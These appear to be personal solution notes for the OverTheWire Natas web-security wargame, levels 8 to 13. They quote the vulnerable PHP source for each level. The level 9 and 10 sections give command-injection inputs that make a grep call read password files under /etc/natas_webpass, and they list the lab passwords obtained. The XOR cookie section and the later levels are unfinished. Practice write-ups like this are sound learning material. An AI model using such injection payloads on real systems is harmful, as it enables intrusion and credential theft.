## What we learned

- `xor cipher` is a symmetric function, which means that `plaintext ^ key = ciphertext` and `plaintext ^ ciphertex = key`


Flag: `Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd`

%% ------------------------------------------------------------------

### Level 8 -> Level 9

Goal: 

```
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org

<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>

the function 'passthru' execute the command passed

2. submit
>>> b /dev/null; cat /etc/natas_webpass/natas10;
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

Note: we can also submit . /etc/natas_webpass/natas10


```

Flag: `D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE`

%% ------------------------------------------------------------------

### Level 9 -> Level 10

Goal: 

```
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org


<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>

2. submit: ". /etc/natas_webpass/natas11 #"
/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

>>> python natas10.py

```

Flag: `1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg`


%% ------------------------------------------------------------------

### Level 10 -> Level 11

Goal: 

```
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org

>>> python3 natas11.py

<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>



saveData($data);



1. get the cookie from python: request.Session(); session.cookies
Cookie:   MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D
Unquoted: MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=

%3D -> url encoded character

2. get XOR cipher key: plaintext ^ ciphertext = key
plaintext: 
ciphertext: 


3. 

```

Flag: ``



%% ------------------------------------------------------------------

### Level 11 -> Level 12

Goal: 

```
Username: natas12
URL:      http://natas12.natas.labs.overthewire.org

>>> python3 natas12.py

```

Flag: ``


%% ------------------------------------------------------------------

### Level 12 -> Level 13

Goal: 

```
Username: natas13
URL:      http://natas13.natas.labs.overthewire.org

>>> python3 natas13.py

```

Flag: ``



